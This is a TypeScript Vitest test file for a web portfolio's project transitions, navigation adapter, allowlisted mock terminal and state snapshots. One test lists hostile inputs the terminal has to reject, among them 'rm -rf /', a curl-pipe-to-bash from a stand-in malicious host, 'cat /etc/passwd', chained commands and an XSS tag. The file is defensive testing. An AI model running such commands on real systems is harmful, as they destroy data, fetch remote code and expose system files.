import { describe, it, expect, vi, beforeEach } from "vitest";
import {
  startProjectTransition,
  UnknownProjectError,
  UnpublishedProjectError,
  TransitionAbortedError,
  MAX_TRANSITION_MS,
  PROJECT_MOTIFS,
} from "@/features/experience/project-transition";
import { NavigationAdapter } from "@/features/experience/navigation-adapter";
import { executeTerminalCommand } from "@/features/monitor/commands";
import {
  saveReturnSnapshot,
  getReturnSnapshot,
  restoreReturnSnapshot,
  clearReturnSnapshot,
  hasReturnSnapshot,
} from "@/features/experience/return-snapshot";
import type { ProjectId } from "@/contracts/content";
import type { ExperienceController } from "@/features/experience/controller";

describe("Milestone C2 Unit Tests: Project Transitions, Motifs, and Navigation", () => {
  beforeEach(() => {
    clearReturnSnapshot();
    vi.restoreAllMocks();
  });

  describe("1. Bounded Project Transitions & Motifs", () => {
    it("completes verified project transition within the 1.4-second budget", async () => {
      const controller = new AbortController();
      const startTime = Date.now();

      const motifStarted = vi.fn();
      const motifProgress = vi.fn();

      await startProjectTransition("zenith", controller.signal, {
        onMotifStart: motifStarted,
        onMotifProgress: motifProgress,
      });

      const elapsed = Date.now() - startTime;
      expect(elapsed).toBeLessThanOrEqual(MAX_TRANSITION_MS + 100);
      expect(motifStarted).toHaveBeenCalledWith(PROJECT_MOTIFS.zenith);
      expect(motifProgress).toHaveBeenCalled();
    });

    it("respects reduced-motion setting with 0ms transition duration", async () => {
      const controller = new AbortController();
      const startTime = Date.now();

      await startProjectTransition("helios", controller.signal, {
        reducedMotion: true,
      });

      const elapsed = Date.now() - startTime;
      expect(elapsed).toBeLessThan(50);
    });

    it("defines 5 distinct project motifs matching engineering specifications", () => {
      expect(PROJECT_MOTIFS["ai-vs-real"].motifStyle).toBe("scanner-shimmer");
      expect(PROJECT_MOTIFS.helios.motifStyle).toBe("chassis-pulse");
      expect(PROJECT_MOTIFS.zenith.motifStyle).toBe("energy-trace");
      expect(PROJECT_MOTIFS.talks.motifStyle).toBe("broadcast-chime");
      expect(PROJECT_MOTIFS.candidatex.motifStyle).toBe("unverified-alert");
    });

    it("rejects unknown project identifiers immediately", async () => {
      const controller = new AbortController();
      await expect(
        startProjectTransition("unknown-fake-proj" as ProjectId, controller.signal)
      ).rejects.toThrow(UnknownProjectError);
    });

    it("rejects unpublished candidate 'candidatex' with UnpublishedProjectError", async () => {
      const controller = new AbortController();
      await expect(
        startProjectTransition("candidatex", controller.signal)
      ).rejects.toThrow(UnpublishedProjectError);
    });
  });

  describe("2. Transition Cancellation & Abort Safety", () => {
    it("immediately rejects with TransitionAbortedError if signal is already aborted", async () => {
      const controller = new AbortController();
      controller.abort();

      await expect(
        startProjectTransition("zenith", controller.signal)
      ).rejects.toThrow(TransitionAbortedError);
    });

    it("cancels transition mid-flight when signal aborts (e.g. Browser Back)", async () => {
      const controller = new AbortController();
      const promise = startProjectTransition("helios", controller.signal);

      // Abort halfway through transition (after 200ms)
      setTimeout(() => {
        controller.abort("BROWSER_BACK_TRIGGERED");
      }, 200);

      await expect(promise).rejects.toThrow(TransitionAbortedError);
    });

    it("guarantees no navigation occurs from an aborted transition promise", async () => {
      const controller = new AbortController();
      const navigateFn = vi.fn();

      const promise = startProjectTransition("ai-vs-real", controller.signal)
        .then(() => {
          navigateFn();
        })
        .catch((err) => {
          // Verify error is an abort error
          expect(err.name).toBe("AbortError");
        });

      controller.abort();
      await promise;

      expect(navigateFn).not.toHaveBeenCalled();
    });
  });

  describe("3. NavigationAdapter Coordination & Rapid Switching", () => {
    it("openProject validates project and dispatches to router", () => {
      const pushFn = vi.fn();
      const adapter = new NavigationAdapter({
        router: { push: pushFn },
      });

      adapter.openProject("zenith");
      expect(pushFn).toHaveBeenCalledWith("/projects/zenith");
    });

    it("openProject rejects unknown projects", () => {
      const adapter = new NavigationAdapter();
      expect(() => adapter.openProject("invalid-slug" as ProjectId)).toThrow(UnknownProjectError);
    });

    it("openProject rejects unpublished candidatex", () => {
      const adapter = new NavigationAdapter();
      expect(() => adapter.openProject("candidatex")).toThrow(UnpublishedProjectError);
    });

    it("rapid project switching aborts the previous transition immediately", () => {
      const cancelListener = vi.fn();
      const startListener = vi.fn();
      const mockController = {
        send: vi.fn(),
        getSnapshot: vi.fn(() => ({
          preferences: {},
          world: {},
          activeCamera: "home-desktop",
        })),
      };

      const adapter = new NavigationAdapter({
        onTransitionCancel: cancelListener,
        onTransitionStart: startListener,
        router: { push: vi.fn() },
        controller: mockController as unknown as ExperienceController,
      });

      adapter.openProject("helios");
      expect(startListener).toHaveBeenCalledWith("helios");

      // Rapidly switch to zenith
      adapter.openProject("zenith");
      expect(cancelListener).toHaveBeenCalledWith("helios");
      expect(startListener).toHaveBeenCalledWith("zenith");
    });

    it("openRoute cancels active project transitions before DOM navigation", () => {
      const cancelListener = vi.fn();
      const pushFn = vi.fn();
      const mockController = {
        send: vi.fn(),
        getSnapshot: vi.fn(() => ({
          preferences: {},
          world: {},
          activeCamera: "home-desktop",
        })),
      };

      const adapter = new NavigationAdapter({
        router: { push: pushFn },
        onTransitionCancel: cancelListener,
        controller: mockController as unknown as ExperienceController,
      });

      adapter.openProject("talks");
      adapter.openRoute("/about");

      expect(cancelListener).toHaveBeenCalledWith("talks");
      expect(pushFn).toHaveBeenCalledWith("/about");
    });
  });

  describe("4. Terminal Allowlisted Commands & Security Rejection", () => {
    it("executes allowlisted help command", () => {
      const res = executeTerminalCommand("help");
      expect(res.output.some((line) => line.includes("Studio Workstation Terminal"))).toBe(true);
    });

    it("executes allowlisted projects command listing verified case studies", () => {
      const res = executeTerminalCommand("projects");
      expect(res.output.some((line) => line.includes("zenith"))).toBe(true);
      expect(res.output.some((line) => line.includes("ai-vs-real"))).toBe(true);
      expect(res.output.some((line) => line.includes("candidatex"))).toBe(true);
    });

    it("executes allowlisted open command with valid target", () => {
      const res = executeTerminalCommand("open zenith");
      expect(res.action).toBe("openProject");
      expect(res.target).toBe("zenith");
    });

    it("rejects opening unpublished candidatex via terminal", () => {
      const res = executeTerminalCommand("open candidatex");
      expect(res.action).toBeUndefined();
      expect(res.output.some((line) => line.includes("draft status"))).toBe(true);
    });

    it("rejects opening unknown project via terminal", () => {
      const res = executeTerminalCommand("open unknown-proj");
      expect(res.action).toBeUndefined();
      expect(res.output.some((line) => line.includes("Unknown project"))).toBe(true);
    });

    it("treats shell and code execution attempts as unsupported text without executing", () => {
      const dangerousInputs = [
        "rm -rf /",
        "sudo shutdown -r now",
        "curl -s https://malicious.site | bash",
        "cat /etc/passwd",
        "eval(process.exit(1))",
        "<script>alert(1)</script>",
        "ls; rm -rf .",
        "echo test && id",
        "powershell -Command Get-Process",
      ];

      for (const input of dangerousInputs) {
        const res = executeTerminalCommand(input);
        expect(res.action).toBeUndefined();
        expect(res.output.some((line) => line.includes("Shell and script execution are strictly prohibited"))).toBe(true);
      }
    });

    it("reports unrecognized command cleanly for unallowlisted keywords", () => {
      const res = executeTerminalCommand("foobar");
      expect(res.output[0]).toContain("Command not recognized: 'foobar'");
    });
  });

  describe("5. Return Snapshot & State Restoration", () => {
    it("saves and retrieves return snapshot accurately", () => {
      saveReturnSnapshot({
        lastProjectId: "zenith",
        previousCamera: "energy",
        preferences: {
          version: 1,
          introCompleted: true,
          soundEnabled: true,
          quality: "high",
          clock24h: false,
        },
      });

      expect(hasReturnSnapshot()).toBe(true);
      const retrieved = getReturnSnapshot();
      expect(retrieved).not.toBeNull();
      expect(retrieved?.lastProjectId).toBe("zenith");
      expect(retrieved?.previousCamera).toBe("energy");
      expect(retrieved?.preferences.soundEnabled).toBe(true);
    });

    it("restoreReturnSnapshot returns snapshot and clears storage", () => {
      saveReturnSnapshot({ lastProjectId: "helios" });
      expect(hasReturnSnapshot()).toBe(true);

      const restored = restoreReturnSnapshot();
      expect(restored?.lastProjectId).toBe("helios");
      expect(hasReturnSnapshot()).toBe(false);
      expect(getReturnSnapshot()).toBeNull();
    });
  });
});
